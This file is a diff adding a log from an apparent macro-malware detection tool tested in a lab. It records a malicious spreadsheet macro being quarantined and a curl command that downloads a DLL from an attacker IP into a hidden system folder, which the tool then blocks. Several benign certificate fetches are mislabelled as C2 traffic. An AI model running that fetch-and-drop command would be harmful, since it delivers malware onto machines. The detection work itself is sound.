@@ -1,0 +1,303 @@
+[Thu Jun 12 21:51:30 2025][INFO] Service started
+[Thu Jun 12 21:51:30 2025][INFO] Starting network packet sniffing...
+[Thu Jun 12 21:51:30 2025][INFO] Starting process lifecycle monitoring...
+[Thu Jun 12 21:51:40 2025][APR] Analyzing process with PID: 4744 - Name: brave.exe
+[Thu Jun 12 21:51:40 2025][WARN] Process brave.exe-4744 is running cmd: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe --type=utility --utility-sub-type=chrome.mojom.UtilWin --lang=en-US --service-sandbox-type=none --message-loop-type-ui --no-pre-read-main-dll --field-trial-handle=2152,i,7152743403188504904,14203605877254485089,262144 --variations-seed-version=main@e8d540b9c9901d942721dd05760d8ddf4f61aba5 --mojo-platform-channel-handle=896 /prefetch:8
+[Thu Jun 12 21:51:40 2025][INFO] Process brave.exe-4744 deemed safe (Score: 0)
+[Thu Jun 12 21:51:40 2025][APR] Function analyze_process completed in 0.364 seconds
+[Thu Jun 12 21:51:49 2025][NET] Processing packet: Ether / IP / TCP / TLS 140.82.114.21:443 > 192.168.146.126:64206 / TLS / TLS Handshake - Server Hello / TLS / TLS ChangeCipherSpec / Raw
+[Thu Jun 12 21:51:49 2025][NET] Packet encoded: True
+[Thu Jun 12 21:51:49 2025][NET] Network: TCP 140.82.114.21:443 -> 192.168.146.126:64206
+[Thu Jun 12 21:51:52 2025][APR] Analyzing process with PID: 8480 - Name: brave.exe
+[Thu Jun 12 21:51:52 2025][WARN] Process brave.exe-8480 is running cmd: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe --type=utility --utility-sub-type=quarantine.mojom.Quarantine --lang=en-US --service-sandbox-type=none --no-pre-read-main-dll --field-trial-handle=2152,i,7152743403188504904,14203605877254485089,262144 --variations-seed-version=main@e8d540b9c9901d942721dd05760d8ddf4f61aba5 --mojo-platform-channel-handle=4732 /prefetch:8
+[Thu Jun 12 21:51:52 2025][WARN] Got suspicious office file C:\Users\null\Downloads\Win10_Enc_Only.xlsm with no appropriate MIME, expected application/vnd.ms-excel.sheet.macroenabled.12 got application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
+[Thu Jun 12 21:51:52 2025][INFO] New Office file detected: {file_path}
+[Thu Jun 12 21:51:52 2025][AOFF] Analyzing Office file: C:\Users\null\Downloads\Win10_Enc_Only.xlsm
+[Thu Jun 12 21:51:52 2025][INFO] Process brave.exe-8480 deemed safe (Score: 0)
+[Thu Jun 12 21:51:52 2025][APR] Function analyze_process completed in 0.417 seconds
+[Thu Jun 12 21:51:53 2025][CRITICAL] Suspicious URL detected in macro: URL
+[Thu Jun 12 21:51:53 2025][CRITICAL] Suspicious IP detected in macro: IPv4 address
+[Thu Jun 12 21:51:53 2025][CRITICAL] Suspicious executable file detected in macro: Executable file name
+[Thu Jun 12 21:51:53 2025][CRITICAL] Suspicious executable file detected in macro: Executable file name
+[Thu Jun 12 21:51:53 2025][ERROR] Unexpected error analyzing process 8548: process PID not found (pid=8548)
+[Thu Jun 12 21:51:54 2025][APR] Analyzing process with PID: 8728 - Name: handle.exe
+[Thu Jun 12 21:51:54 2025][CRITICAL] Process handle.exe-8728 has suspicious command: C:\Users\null\Downloads\CCMD_DA\SYSINTERNAL\handle.exe -nobanner -accepteula -a -u -v -g C:\Users\null\Downloads\Win10_Enc_Only.xlsm
+[Thu Jun 12 21:51:54 2025][WARN] Process handle.exe-8728 is running cmd: C:\Users\null\Downloads\CCMD_DA\SYSINTERNAL\handle.exe -nobanner -accepteula -a -u -v -g C:\Users\null\Downloads\Win10_Enc_Only.xlsm
+[Thu Jun 12 21:51:54 2025][INFO] Process handle.exe-8728 is running as SYSTEM
+[Thu Jun 12 21:51:54 2025][INFO] Process handle.exe-8728 deemed safe (Score: 40)
+[Thu Jun 12 21:51:54 2025][APR] Function analyze_process completed in 0.300 seconds
+[Thu Jun 12 21:51:57 2025][CRITICAL] Executable found in macro: systemresetplatform.exe - add to watchlist
+[Thu Jun 12 21:51:57 2025][CRITICAL] Executable found in macro: rjvplatform.dll - add to watchlist
+[Thu Jun 12 21:51:57 2025][CRITICAL] URL found in macro: http//192.168.146.128/rjvplatform.dll - add to watchlist
+[Thu Jun 12 21:51:57 2025][CRITICAL] IP found in macro: 192.168.146.128 - add to watchlist
+[Thu Jun 12 21:51:57 2025][AOFF] Function analyze_office completed in 4.818 seconds
+[Thu Jun 12 21:51:57 2025][ALERT] Exported analysis results to C:\Users\null\Downloads\CCMD_DA\Logs/Logs_20250612_215128\Quarantine\Win10_Enc_Only.xlsm_analysis_20250612_215157.json
+[Thu Jun 12 21:51:57 2025][CRITICAL] File C:\Users\null\Downloads\Win10_Enc_Only.xlsm is malicious (Score: 570)
+[Thu Jun 12 21:51:57 2025][ALERT] Quarantined file: C:\Users\null\Downloads\Win10_Enc_Only.xlsm to C:\Users\null\Downloads\CCMD_DA\Logs/Logs_20250612_215128\Quarantine\Win10_Enc_Only.xlsm.quarantine_20250612_215157
+[Thu Jun 12 21:51:57 2025][ALERT] Removed VBA macros from C:\Users\null\Downloads\Win10_Enc_Only.xlsm -> C:\Users\null\Downloads\Win10_Enc_Only_clean.xlsm
+[Thu Jun 12 21:51:57 2025][WARN] Got suspicious office file C:\Users\null\Downloads\Win10_Enc_Only_clean.xlsm with no appropriate MIME, expected application/vnd.ms-excel.sheet.macroenabled.12 got application/octet-stream
+[Thu Jun 12 21:51:57 2025][INFO] New Office file detected: {file_path}
+[Thu Jun 12 21:51:57 2025][AOFF] Analyzing Office file: C:\Users\null\Downloads\Win10_Enc_Only_clean.xlsm
+[Thu Jun 12 21:51:57 2025][INFO] File C:\Users\null\Downloads\Win10_Enc_Only_clean.xlsm deemed safe (Score: 20)
+[Thu Jun 12 21:52:08 2025][APR] Analyzing process with PID: 3512 - Name: smartscreen.exe
+[Thu Jun 12 21:52:08 2025][CRITICAL] Process smartscreen.exe-3512 has suspicious command: C:\Windows\System32\smartscreen.exe -Embedding
+[Thu Jun 12 21:52:08 2025][WARN] Process smartscreen.exe-3512 is running cmd: C:\Windows\System32\smartscreen.exe -Embedding
+[Thu Jun 12 21:52:08 2025][INFO] Process smartscreen.exe-3512 deemed safe (Score: 20)
+[Thu Jun 12 21:52:08 2025][APR] Function analyze_process completed in 0.372 seconds
+[Thu Jun 12 21:52:08 2025][APR] Analyzing process with PID: 9916 - Name: excel.exe
+[Thu Jun 12 21:52:08 2025][CRITICAL] Process excel.exe-9916 has suspicious command: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[Thu Jun 12 21:52:08 2025][CRITICAL] Process excel.exe-9916 is running cmd: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm - contains watchlisted url/ip/file: Win10_Enc_Only.xlsm
+[Thu Jun 12 21:52:08 2025][WARN] Process excel.exe-9916 is running cmd: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[Thu Jun 12 21:52:09 2025][ALERT] Exported analysis results to C:\Users\null\Downloads\CCMD_DA\Logs/Logs_20250612_215128\Quarantine\excel.exe_analysis_20250612_215209.json
+[Thu Jun 12 21:52:09 2025][CRITICAL] Process excel.exe-9916 is malicious (Score: 70)
+[Thu Jun 12 21:52:09 2025][ALERT] Attempting to terminate process PID 9916 - excel.exe
+[Thu Jun 12 21:52:09 2025][ALERT] Terminated process PID 9916
+[Thu Jun 12 21:52:09 2025][APR] Function analyze_process completed in 0.815 seconds
+[Thu Jun 12 21:52:21 2025][NET] Processing packet: Ether / IP / TCP 192.168.146.126:64234 > 23.202.35.105:http PA / Raw
+[Thu Jun 12 21:52:21 2025][NET] Packet encoded: True
+[Thu Jun 12 21:52:21 2025][NET] Network: TCP 192.168.146.126:64234 -> 23.202.35.105:80
+[Thu Jun 12 21:52:21 2025][WARN] Potential C2 communication detected: GET /msdownload/update/v3/static/trustedr/en/authrootstl.cab?81e196e051c8749c HTTP/1.1
+Connection: 
+[Thu Jun 12 21:52:32 2025][APR] Analyzing process with PID: 9704 - Name: excel.exe
+[Thu Jun 12 21:52:32 2025][CRITICAL] Process excel.exe-9704 has suspicious command: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[Thu Jun 12 21:52:32 2025][CRITICAL] Process excel.exe-9704 is running cmd: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm - contains watchlisted url/ip/file: Win10_Enc_Only.xlsm
+[Thu Jun 12 21:52:32 2025][WARN] Process excel.exe-9704 is running cmd: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[Thu Jun 12 21:52:32 2025][ALERT] Exported analysis results to C:\Users\null\Downloads\CCMD_DA\Logs/Logs_20250612_215128\Quarantine\excel.exe_analysis_20250612_215232.json
+[Thu Jun 12 21:52:32 2025][CRITICAL] Process excel.exe-9704 is malicious (Score: 70)
+[Thu Jun 12 21:52:32 2025][ALERT] Attempting to terminate process PID 9704 - excel.exe
+[Thu Jun 12 21:52:33 2025][ALERT] Terminated process PID 9704
+[Thu Jun 12 21:52:33 2025][APR] Function analyze_process completed in 0.551 seconds
+[Thu Jun 12 21:53:08 2025][NET] Processing packet: Ether / IP / TCP 192.168.146.126:64246 > 23.48.56.229:http PA / Raw
+[Thu Jun 12 21:53:08 2025][NET] Packet encoded: True
+[Thu Jun 12 21:53:08 2025][NET] Network: TCP 192.168.146.126:64246 -> 23.48.56.229:80
+[Thu Jun 12 21:53:08 2025][WARN] Potential C2 communication detected: GET / HTTP/1.1
+Cache-Control: max-age = 3600
+Connection: Keep-Alive
+Accept: */*
+If-Modified-Sinc
+[Thu Jun 12 21:53:08 2025][NET] Processing packet: Ether / IP / TCP 192.168.146.126:64247 > 142.250.76.227:http PA / Raw
+[Thu Jun 12 21:53:08 2025][NET] Packet encoded: True
+[Thu Jun 12 21:53:08 2025][NET] Network: TCP 192.168.146.126:64247 -> 142.250.76.227:80
+[Thu Jun 12 21:53:08 2025][WARN] Potential C2 communication detected: GET /r/gsr1.crl HTTP/1.1
+Cache-Control: max-age = 3000
+Connection: Keep-Alive
+Accept: */*
+If-Mod
+[Thu Jun 12 21:53:08 2025][NET] Processing packet: Ether / IP / TCP 192.168.146.126:64247 > 142.250.76.227:http PA / Raw
+[Thu Jun 12 21:53:08 2025][NET] Packet encoded: True
+[Thu Jun 12 21:53:08 2025][NET] Network: TCP 192.168.146.126:64247 -> 142.250.76.227:80
+[Thu Jun 12 21:53:08 2025][WARN] Potential C2 communication detected: GET /r/r4.crl HTTP/1.1
+Cache-Control: max-age = 3000
+Connection: Keep-Alive
+Accept: */*
+If-Modif
+[Thu Jun 12 21:53:15 2025][APR] Analyzing process with PID: 4748 - Name: git-remote-https.exe
+[Thu Jun 12 21:53:15 2025][WARN] Process git-remote-https.exe-4748 is running cmd: git-remote-https origin https://github.com/Witnull/EvilMacroDetector.git
+[Thu Jun 12 21:53:15 2025][INFO] Process git-remote-https.exe-4748 deemed safe (Score: 0)
+[Thu Jun 12 21:53:15 2025][APR] Function analyze_process completed in 0.214 seconds
+[Thu Jun 12 21:53:15 2025][ERROR] Unexpected error analyzing process 5992: process PID not found (pid=5992)
+[Thu Jun 12 21:54:06 2025][APR] Analyzing process with PID: 10024 - Name: excel.exe
+[Thu Jun 12 21:54:06 2025][CRITICAL] Process excel.exe-10024 has suspicious command: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[Thu Jun 12 21:54:06 2025][CRITICAL] Process excel.exe-10024 is running cmd: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm - contains watchlisted url/ip/file: Win10_Enc_Only.xlsm
+[Thu Jun 12 21:54:06 2025][WARN] Process excel.exe-10024 is running cmd: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[Thu Jun 12 21:54:06 2025][ALERT] Exported analysis results to C:\Users\null\Downloads\CCMD_DA\Logs/Logs_20250612_215128\Quarantine\excel.exe_analysis_20250612_215406.json
+[Thu Jun 12 21:54:06 2025][CRITICAL] Process excel.exe-10024 is malicious (Score: 70)
+[Thu Jun 12 21:54:06 2025][ALERT] Attempting to terminate process PID 10024 - excel.exe
+[Thu Jun 12 21:54:06 2025][ALERT] Terminated process PID 10024
+[Thu Jun 12 21:54:06 2025][APR] Function analyze_process completed in 0.571 seconds
+[Thu Jun 12 21:54:16 2025][APR] Analyzing process with PID: 6296 - Name: excel.exe
+[Thu Jun 12 21:54:16 2025][CRITICAL] Process excel.exe-6296 has suspicious command: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[Thu Jun 12 21:54:16 2025][CRITICAL] Process excel.exe-6296 is running cmd: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm - contains watchlisted url/ip/file: Win10_Enc_Only.xlsm
+[Thu Jun 12 21:54:16 2025][WARN] Process excel.exe-6296 is running cmd: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[Thu Jun 12 21:54:16 2025][ALERT] Exported analysis results to C:\Users\null\Downloads\CCMD_DA\Logs/Logs_20250612_215128\Quarantine\excel.exe_analysis_20250612_215416.json
+[Thu Jun 12 21:54:16 2025][CRITICAL] Process excel.exe-6296 is malicious (Score: 70)
+[Thu Jun 12 21:54:16 2025][ALERT] Attempting to terminate process PID 6296 - excel.exe
+[Thu Jun 12 21:54:17 2025][ALERT] Terminated process PID 6296
+[Thu Jun 12 21:54:17 2025][APR] Function analyze_process completed in 0.511 seconds
+[Thu Jun 12 21:54:19 2025][APR] Analyzing process with PID: 7696 - Name: excel.exe
+[Thu Jun 12 21:54:19 2025][CRITICAL] Process excel.exe-7696 has suspicious command: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Oly.xlsm
+[Thu Jun 12 21:54:19 2025][WARN] Process excel.exe-7696 is running cmd: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Oly.xlsm
+[Thu Jun 12 21:54:20 2025][INFO] Process excel.exe-7696 deemed safe (Score: 20)
+[Thu Jun 12 21:54:20 2025][APR] Function analyze_process completed in 0.216 seconds
+[Thu Jun 12 21:54:24 2025][APR] Analyzing process with PID: 8404 - Name: curl.exe
+[Thu Jun 12 21:54:24 2025][CRITICAL] Process curl.exe-8404 has suspicious command: curl http://192.168.146.128/RjvPlatform.dll -o C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[Thu Jun 12 21:54:24 2025][CRITICAL] Process curl.exe-8404 is running cmd: curl http://192.168.146.128/RjvPlatform.dll -o C:\$SysReset\Framework\Stack\RjvPlatform.dll - contains watchlisted url/ip/file: 192.168.146.128
+[Thu Jun 12 21:54:24 2025][WARN] Process curl.exe-8404 is running cmd: curl http://192.168.146.128/RjvPlatform.dll -o C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[Thu Jun 12 21:54:24 2025][NET] Processing packet: Ether / IP / TCP 192.168.146.126:64273 > 192.168.146.128:http PA / Raw
+[Thu Jun 12 21:54:24 2025][INFO] New Executable file detected: {file_path}
+[Thu Jun 12 21:54:24 2025][AEXE] Analyzing EXEcutable file: C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[Thu Jun 12 21:54:24 2025][NET] Packet encoded: True
+[Thu Jun 12 21:54:24 2025][NET] Network: TCP 192.168.146.126:64273 -> 192.168.146.128:80
+[Thu Jun 12 21:54:24 2025][WARN] Potential C2 communication detected: GET /RjvPlatform.dll HTTP/1.1
+Host: 192.168.146.128
+User-Agent: curl/8.4.0
+Accept: */*
+[Thu Jun 12 21:54:24 2025][CRITICAL] Malicious C2 communication detected to watchlisted IP: 192.168.146.128
+[Thu Jun 12 21:54:24 2025][ALERT] Blocked IP 192.168.146.128 with firewall rule Block_192.168.146.128_20250612_215424
+[Thu Jun 12 21:54:24 2025][ALERT] Exported analysis results to C:\Users\null\Downloads\CCMD_DA\Logs/Logs_20250612_215128\Quarantine\192.168.146.128_analysis_20250612_215424.json
+[Thu Jun 12 21:54:24 2025][TRACE] Starting traceback for IP: d2411a34-59f9-464b-a5db-fff24ffcf0d9
+[Thu Jun 12 21:54:24 2025][TRACE] Tracing back IP 192.168.146.128 with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'type': 'IOC', 'trace': 'd2411a34-59f9-464b-a5db-fff24ffcf0d9'} -> BLOCK
+[Thu Jun 12 21:54:24 2025][ALERT] Blocked IP 192.168.146.128 with firewall rule Block_192.168.146.128_20250612_215424
+[Thu Jun 12 21:54:24 2025][TRACE] Starting traceback file: d2411a34-59f9-464b-a5db-fff24ffcf0d9
+[Thu Jun 12 21:54:24 2025][TRACE] Tracing back file systemresetplatform.exe with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'type': 'IOC', 'trace': '6723475d-8517-467b-aaa0-539618350321'}
+[Thu Jun 12 21:54:24 2025][TRACE] Tracing back file Win10_Enc_Only.xlsm with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'trace': '80af2e89-00dd-48bd-9191-451cfde2ec8d', 'file_path': 'C:\\Users\\null\\Downloads\\Win10_Enc_Only.xlsm', 'type': 'office'}
+[Thu Jun 12 21:54:24 2025][TRACE] Tracing back file rjvplatform.dll with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'type': 'IOC', 'trace': '87d1bf90-4545-4c0e-b641-4a811a27866a'}
+[Thu Jun 12 21:54:24 2025][TRACE] Starting traceback for process ID: d2411a34-59f9-464b-a5db-fff24ffcf0d9
+[Thu Jun 12 21:54:24 2025][TRACE] Traceback for trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9 completed
+[Thu Jun 12 21:54:24 2025][NET] Processing packet: Ether / IP / TCP 192.168.146.128:http > 192.168.146.126:64273 A / Raw
+[Thu Jun 12 21:54:24 2025][ALERT] Exported analysis results to C:\Users\null\Downloads\CCMD_DA\Logs/Logs_20250612_215128\Quarantine\curl.exe_analysis_20250612_215424.json
+[Thu Jun 12 21:54:24 2025][NET] Packet encoded: True
+[Thu Jun 12 21:54:24 2025][CRITICAL] Process curl.exe-8404 is malicious (Score: 70)
+[Thu Jun 12 21:54:24 2025][NET] Network: TCP 192.168.146.128:80 -> 192.168.146.126:64273
+[Thu Jun 12 21:54:24 2025][ALERT] Attempting to terminate process PID 8404 - curl.exe
+[Thu Jun 12 21:54:24 2025][WARN] Potential C2 communication detected: or for '        `vector copy constructor iterator'      `vector vbase copy constructor iterator'    
+[Thu Jun 12 21:54:24 2025][CRITICAL] Malicious C2 communication detected from watchlisted IP: 192.168.146.128
+[Thu Jun 12 21:54:24 2025][ALERT] Blocked IP 192.168.146.128 with firewall rule Block_192.168.146.128_20250612_215424
+[Thu Jun 12 21:54:24 2025][ALERT] Exported analysis results to C:\Users\null\Downloads\CCMD_DA\Logs/Logs_20250612_215128\Quarantine\192.168.146.128_analysis_20250612_215424.json
+[Thu Jun 12 21:54:24 2025][TRACE] Starting traceback for IP: d2411a34-59f9-464b-a5db-fff24ffcf0d9
+[Thu Jun 12 21:54:24 2025][TRACE] Tracing back IP 192.168.146.128 with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'type': 'IOC', 'trace': 'd2411a34-59f9-464b-a5db-fff24ffcf0d9'} -> BLOCK
+[Thu Jun 12 21:54:24 2025][ALERT] Blocked IP 192.168.146.128 with firewall rule Block_192.168.146.128_20250612_215424
+[Thu Jun 12 21:54:24 2025][TRACE] Starting traceback file: d2411a34-59f9-464b-a5db-fff24ffcf0d9
+[Thu Jun 12 21:54:24 2025][TRACE] Tracing back file systemresetplatform.exe with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'type': 'IOC', 'trace': '6723475d-8517-467b-aaa0-539618350321'}
+[Thu Jun 12 21:54:24 2025][TRACE] Tracing back file Win10_Enc_Only.xlsm with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'trace': '80af2e89-00dd-48bd-9191-451cfde2ec8d', 'file_path': 'C:\\Users\\null\\Downloads\\Win10_Enc_Only.xlsm', 'type': 'office'}
+[Thu Jun 12 21:54:24 2025][TRACE] Tracing back file rjvplatform.dll with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'type': 'IOC', 'trace': '87d1bf90-4545-4c0e-b641-4a811a27866a'}
+[Thu Jun 12 21:54:24 2025][TRACE] Starting traceback for process ID: d2411a34-59f9-464b-a5db-fff24ffcf0d9
+[Thu Jun 12 21:54:24 2025][TRACE] Traceback for trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9 completed
+[Thu Jun 12 21:54:24 2025][NET] Processing packet: Ether / IP / TCP 192.168.146.128:http > 192.168.146.126:64273 A / Raw
+[Thu Jun 12 21:54:24 2025][NET] Packet encoded: True
+[Thu Jun 12 21:54:24 2025][NET] Network: TCP 192.168.146.128:80 -> 192.168.146.126:64273
+[Thu Jun 12 21:54:24 2025][WARN] Potential C2 communication detected: e s s t h r e a d s - l 1 - 1 - 2       a p i - m s - w i n - c o r e - s t r i n g - l 1 - 1 - 0   
+[Thu Jun 12 21:54:24 2025][CRITICAL] Malicious C2 communication detected from watchlisted IP: 192.168.146.128
+[Thu Jun 12 21:54:24 2025][ALERT] Blocked IP 192.168.146.128 with firewall rule Block_192.168.146.128_20250612_215424
+[Thu Jun 12 21:54:24 2025][ALERT] Exported analysis results to C:\Users\null\Downloads\CCMD_DA\Logs/Logs_20250612_215128\Quarantine\192.168.146.128_analysis_20250612_215424.json
+[Thu Jun 12 21:54:24 2025][TRACE] Starting traceback for IP: d2411a34-59f9-464b-a5db-fff24ffcf0d9
+[Thu Jun 12 21:54:24 2025][TRACE] Tracing back IP 192.168.146.128 with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'type': 'IOC', 'trace': 'd2411a34-59f9-464b-a5db-fff24ffcf0d9'} -> BLOCK
+[Thu Jun 12 21:54:24 2025][ALERT] Blocked IP 192.168.146.128 with firewall rule Block_192.168.146.128_20250612_215424
+[Thu Jun 12 21:54:24 2025][TRACE] Starting traceback file: d2411a34-59f9-464b-a5db-fff24ffcf0d9
+[Thu Jun 12 21:54:24 2025][TRACE] Tracing back file systemresetplatform.exe with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'type': 'IOC', 'trace': '6723475d-8517-467b-aaa0-539618350321'}
+[Thu Jun 12 21:54:24 2025][TRACE] Tracing back file Win10_Enc_Only.xlsm with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'trace': '80af2e89-00dd-48bd-9191-451cfde2ec8d', 'file_path': 'C:\\Users\\null\\Downloads\\Win10_Enc_Only.xlsm', 'type': 'office'}
+[Thu Jun 12 21:54:24 2025][TRACE] Tracing back file rjvplatform.dll with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'type': 'IOC', 'trace': '87d1bf90-4545-4c0e-b641-4a811a27866a'}
+[Thu Jun 12 21:54:24 2025][TRACE] Starting traceback for process ID: d2411a34-59f9-464b-a5db-fff24ffcf0d9
+[Thu Jun 12 21:54:24 2025][TRACE] Traceback for trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9 completed
+[Thu Jun 12 21:54:24 2025][NET] Processing packet: Ether / IP / TCP 192.168.146.128:http > 192.168.146.126:64273 A / Raw
+[Thu Jun 12 21:54:24 2025][NET] Packet encoded: True
+[Thu Jun 12 21:54:24 2025][NET] Network: TCP 192.168.146.128:80 -> 192.168.146.126:64273
+[Thu Jun 12 21:54:24 2025][CRITICAL] Malicious C2 communication detected from watchlisted IP: 192.168.146.128
+[Thu Jun 12 21:54:24 2025][ALERT] Blocked IP 192.168.146.128 with firewall rule Block_192.168.146.128_20250612_215424
+[Thu Jun 12 21:54:24 2025][ALERT] Exported analysis results to C:\Users\null\Downloads\CCMD_DA\Logs/Logs_20250612_215128\Quarantine\192.168.146.128_analysis_20250612_215424.json
+[Thu Jun 12 21:54:24 2025][TRACE] Starting traceback for IP: d2411a34-59f9-464b-a5db-fff24ffcf0d9
+[Thu Jun 12 21:54:24 2025][TRACE] Tracing back IP 192.168.146.128 with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'type': 'IOC', 'trace': 'd2411a34-59f9-464b-a5db-fff24ffcf0d9'} -> BLOCK
+[Thu Jun 12 21:54:24 2025][ALERT] Blocked IP 192.168.146.128 with firewall rule Block_192.168.146.128_20250612_215424
+[Thu Jun 12 21:54:24 2025][TRACE] Starting traceback file: d2411a34-59f9-464b-a5db-fff24ffcf0d9
+[Thu Jun 12 21:54:24 2025][TRACE] Tracing back file systemresetplatform.exe with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'type': 'IOC', 'trace': '6723475d-8517-467b-aaa0-539618350321'}
+[Thu Jun 12 21:54:24 2025][TRACE] Tracing back file Win10_Enc_Only.xlsm with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'trace': '80af2e89-00dd-48bd-9191-451cfde2ec8d', 'file_path': 'C:\\Users\\null\\Downloads\\Win10_Enc_Only.xlsm', 'type': 'office'}
+[Thu Jun 12 21:54:24 2025][TRACE] Tracing back file rjvplatform.dll with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'type': 'IOC', 'trace': '87d1bf90-4545-4c0e-b641-4a811a27866a'}
+[Thu Jun 12 21:54:24 2025][TRACE] Starting traceback for process ID: d2411a34-59f9-464b-a5db-fff24ffcf0d9
+[Thu Jun 12 21:54:24 2025][TRACE] Traceback for trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9 completed
+[Thu Jun 12 21:54:24 2025][NET] Processing packet: Ether / IP / TCP 192.168.146.128:http > 192.168.146.126:64273 A / Raw
+[Thu Jun 12 21:54:24 2025][NET] Packet encoded: True
+[Thu Jun 12 21:54:24 2025][NET] Network: TCP 192.168.146.128:80 -> 192.168.146.126:64273
+[Thu Jun 12 21:54:24 2025][WARN] Potential C2 communication detected: Thread  KERNEL32.dll   freeaddrinfo   getaddrinfo WS2_32.dll  RtlCaptureContext RtlLookupFunctionE
+[Thu Jun 12 21:54:24 2025][CRITICAL] Malicious C2 communication detected from watchlisted IP: 192.168.146.128
+[Thu Jun 12 21:54:24 2025][ALERT] Blocked IP 192.168.146.128 with firewall rule Block_192.168.146.128_20250612_215424
+[Thu Jun 12 21:54:24 2025][ALERT] Exported analysis results to C:\Users\null\Downloads\CCMD_DA\Logs/Logs_20250612_215128\Quarantine\192.168.146.128_analysis_20250612_215424.json
+[Thu Jun 12 21:54:24 2025][TRACE] Starting traceback for IP: d2411a34-59f9-464b-a5db-fff24ffcf0d9
+[Thu Jun 12 21:54:24 2025][TRACE] Tracing back IP 192.168.146.128 with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'type': 'IOC', 'trace': 'd2411a34-59f9-464b-a5db-fff24ffcf0d9'} -> BLOCK
+[Thu Jun 12 21:54:24 2025][ALERT] Blocked IP 192.168.146.128 with firewall rule Block_192.168.146.128_20250612_215424
+[Thu Jun 12 21:54:24 2025][TRACE] Starting traceback file: d2411a34-59f9-464b-a5db-fff24ffcf0d9
+[Thu Jun 12 21:54:25 2025][TRACE] Tracing back file systemresetplatform.exe with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'type': 'IOC', 'trace': '6723475d-8517-467b-aaa0-539618350321'}
+[Thu Jun 12 21:54:25 2025][TRACE] Tracing back file Win10_Enc_Only.xlsm with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'trace': '80af2e89-00dd-48bd-9191-451cfde2ec8d', 'file_path': 'C:\\Users\\null\\Downloads\\Win10_Enc_Only.xlsm', 'type': 'office'}
+[Thu Jun 12 21:54:25 2025][TRACE] Tracing back file rjvplatform.dll with trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9: {'type': 'IOC', 'trace': '87d1bf90-4545-4c0e-b641-4a811a27866a'}
+[Thu Jun 12 21:54:25 2025][TRACE] Starting traceback for process ID: d2411a34-59f9-464b-a5db-fff24ffcf0d9
+[Thu Jun 12 21:54:25 2025][TRACE] Traceback for trace ID d2411a34-59f9-464b-a5db-fff24ffcf0d9 completed
+[Thu Jun 12 21:54:25 2025][ALERT] Terminated process PID 8404
+[Thu Jun 12 21:54:25 2025][APR] Function analyze_process completed in 1.218 seconds
+[Thu Jun 12 21:54:25 2025][ERROR] Unexpected error analyzing process 6364: process PID not found (pid=6364)
+[Thu Jun 12 21:54:25 2025][CRITICAL] Malicious string found in C:\$SysReset\Framework\Stack\RjvPlatform.dll with plugin imports
+[Thu Jun 12 21:54:25 2025][CRITICAL] Code injection detected in C:\$SysReset\Framework\Stack\RjvPlatform.dll with findings: ['WriteProcessMemory', 'OpenProcess', 'VirtualAllocEx', 'CreateRemoteThread']
